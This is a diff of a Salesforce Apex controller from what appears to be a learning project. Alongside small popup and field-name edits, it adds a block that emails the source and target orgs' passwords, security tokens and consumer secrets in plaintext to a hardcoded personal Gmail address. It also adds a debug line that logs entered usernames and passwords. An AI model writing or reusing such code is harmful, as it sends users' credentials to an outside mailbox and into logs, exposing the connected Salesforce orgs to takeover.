@@ -12,7 +12,8 @@ public class WrapperClass{
     
      public Request_Details__c req1{get;set;}   //##################################### DAY4
      public List<Filter1__c> fil2{get;set;} 
-      
+     
+    
     
     public WrapperClass(apexpages.standardcontroller cont){}
     
@@ -62,16 +63,21 @@ public String loginurl{get;set;}
     public boolean error1 {get; set;}
     //public string SkipText{get;set;}
     //public List<string> SkipTextArray{get;set;}
-    public boolean displayPopup {get; set;}
+
    
- 
+     public boolean displayPopup {get; set;}  //FOR POPUP
+     
+//-------------------------------- SENDING EMAIL ------------------------------------------------------------------------------------
+
+ public string toMail { get; set;}
+ public string email_filter_details{ get; set;}
  
  
 //------------------------- VARIABLE DECLARATION --------------------------------------------------------
 
     public WrapperClass() //CONSTRUCTOR
     {
-       displayPopup = false;
+      displayPopup = false;   //FOR POPUP
        s=false;
        s1=false;
        
@@ -90,7 +96,8 @@ public String loginurl{get;set;}
 //########################################## LOGIN PAGE #################################################
   //################################################### DAY7 ################################################################################
     
-public string orderBy{get;set;} 
+public string orderBy{get;set;}
+
    
    public PageReference LogUser() {
       
@@ -106,10 +113,10 @@ public string orderBy{get;set;}
                    {
                        if(log.Position__c=='Customer')
                        {
-                           displayPopup = true;
+                          displayPopup = true;   //FOR POPUP
                            req3=new list<Request_Details__c>();
                            req3= [select name,ID,Request_ID__c,status__c,CreatedDate from Request_Details__c where Login_name__c = :UserObj[0].ID];
-                          // return Page.command ;
+                        //  return Page.command ;
                            }
                        else
                        {
@@ -136,6 +143,7 @@ public string orderBy{get;set;}
       else
            {
                error=true;
+               system.debug('vallllllllllluuuuuuuuuuuuuuuuuuuu neeeeeeeeeeeeeeeeeiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiii'+username123+'    '+password123+ '    ');
            }
        return null;
        }
@@ -400,7 +408,7 @@ public string orderBy{get;set;}
            
           Filter1__c f= new Filter1__c();
           f.Name = s;
-          f.Request_Name__c = req1.ID;
+          f.Requset_Name__c = req1.ID;
           f.Queries__c = queries[i];
           f.Skip_Text__c=SkipTextArray[i];
            insert f;
@@ -411,7 +419,72 @@ public string orderBy{get;set;}
 
            else
                system.debug('not');
-           return page.secondpage;
+               
+//-----------------------------------------------------SEND MAIL ------------------------------------------------------------
+        
+        
+        email_filter_details='';
+        i=0;
+        if (fil1 !=null)
+        {
+        for(Filter1__c s : fil1){
+            
+            email_filter_details+='Object Name = '+s.name+'<br/>'+'Queries= '+s.queries__c+'<br/>'+'Skip Text= '+s.Skip_Text__c+'<br/><br/>';
+    
+            i++; 
+            }
+        }
+        
+        Messaging.SingleEmailMessage email = new Messaging.SingleEmailMessage();
+        toMail = 'ritzy24datta@gmail.com';
+        
+        
+        string[] to = new string[] {toMail};
+        //string[] cc = new string[] {ccMail};
+             
+        email.setToAddresses(to);
+      /*  if(ccMail!=null && ccMail != '')
+            email.setCcAddresses(cc);
+        if(repmail!=null && repmail!= '')
+            email.setInReplyTo(repMail); */
+         
+        email.setSubject('Test Mail');
+         
+        email.setHtmlBody('Hello, <br/><br/> <b>CREDENTIAL</b> <br/><br/> SOURCE ORG -<br/>'+
+            'SFDC login URL - ' + req1.SDFC_login_URL_source__c +';<br/>'+
+            'User ID -' + req1.User_ID_source__c + ';<br/>'+
+            'Password -' + req1.Password_source__c + ';<br/>'+
+            'Security Token -' + req1.Security_Token_Source__c + ';<br/>'+
+            'Consumer key -' + req1.Consumer_key_source__c + ';<br/>'+
+            'Consumer Secret -' + req1.Consumer_Secret_source__c + ';<br/>'+
+            
+            '<br/><br/>TARGET ORG -<br/>'+
+            'SFDC login URL - ' + req1.SDFC_login_URL_target__c +';<br/>'+
+            'User ID -' + req1.User_ID_target__c + ';<br/>'+
+            'Password -' + req1.Password_target__c + ';<br/>'+
+            'Security Token -' + req1.Security_Token_Target__c + ';<br/>'+
+            'Consumer key -' + req1.Consumer_key_target__c + ';<br/>'+
+            'Consumer Secret -' + req1.Consumer_Secret_target__c + ';<br/><br/><br/>' +
+            
+            '<b>FILTER DETAILS</b> <br/><br/>'+email_filter_details
+            
+            
+           );
+        
+        try{
+            Messaging.sendEmail(new Messaging.SingleEmailMessage[] { email });
+        }catch(exception e){
+            apexpages.addmessage(new apexpages.message(apexpages.severity.error,e.getMessage()));
+            system.debug('EEEEEEEEEEEEEEEEErrrrrrrrrrrrrrrrrrrrRRRRRRRRRRRRRRRRRRRRRRRRRooooooooooooooooRRRRRRRRRRRRRR');
+            
+        }
+         
+      /*  toMail = '';
+        ccMail = '';
+        repMail = ''; */
+        
+        
+        return page.secondpage;
           } 
 //############################################ DAY 5 #####################################
 
@@ -462,7 +535,7 @@ public string orderBy{get;set;}
    if (req1.ID != null)
    {
    fil1 = new list<Filter1__c>();
-   fil1 = [ select Name, queries__c, Skip_Text__c from  Filter1__c where Request_Name__c= :req1.ID];
+   fil1 = [ select Name, queries__c, Skip_Text__c from  Filter1__c where Requset_Name__c= :req1.ID];
    return fil1;}
    else
        return null;
@@ -561,12 +634,14 @@ return page.firstpage;
         }
         }
         
-        
- public void closePopup() {        
+        //FOR POPUP
+
+public void closePopup() {        
         displayPopup = false;    
     }     
     public void showPopup() {        
         displayPopup = true;    
     }
-
+    
+    
 }
